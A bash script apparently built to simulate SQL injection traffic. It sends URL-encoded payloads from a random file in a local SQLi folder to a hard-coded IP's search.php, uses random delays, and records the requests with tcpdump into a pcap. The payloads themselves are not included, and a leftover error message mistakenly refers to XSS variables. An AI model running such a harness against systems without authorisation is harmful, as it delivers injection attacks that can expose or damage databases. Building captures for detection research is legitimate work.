#!/bin/bash

TARGET="http://205.174.165.68/search.php"
INTERFACE="eth0"
PCAP_FILE="pcap/sql_injection_$(date +%Y%m%d_%H%M%S).pcap"

SQLi_FOLDER="./SQLi"
SQLi_FILE=$(find "$SQLi_FOLDER" -type f -name "*.txt" | shuf -n 1)

if [ ! -f "$SQLi_FILE" ]; then
  echo "No XSS payload file found in $XSS_FOLDER"
  exit 1
fi

echo "Starting tcpdump..."
sudo tcpdump -i "$INTERFACE" dst 205.174.165.68 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

while IFS= read -r payload || [ -n "$payload" ]; do
  [ -z "$payload" ] && continue

  ENCODED_PAYLOAD=$(printf "%s" "$payload" | jq -s -R -r @uri)
  echo "Sending payload: $payload"
  curl -s "$TARGET?query=$ENCODED_PAYLOAD" > /dev/null

  DELAY=$((RANDOM % 4 + 1))
  echo "Sleeping for $DELAY seconds..."
  sleep "$DELAY"

done < "$SQLi_FILE"

kill "$TCPDUMP_PID"
echo "SQL Injection simulation complete. PCAP saved to $PCAP_FILE"
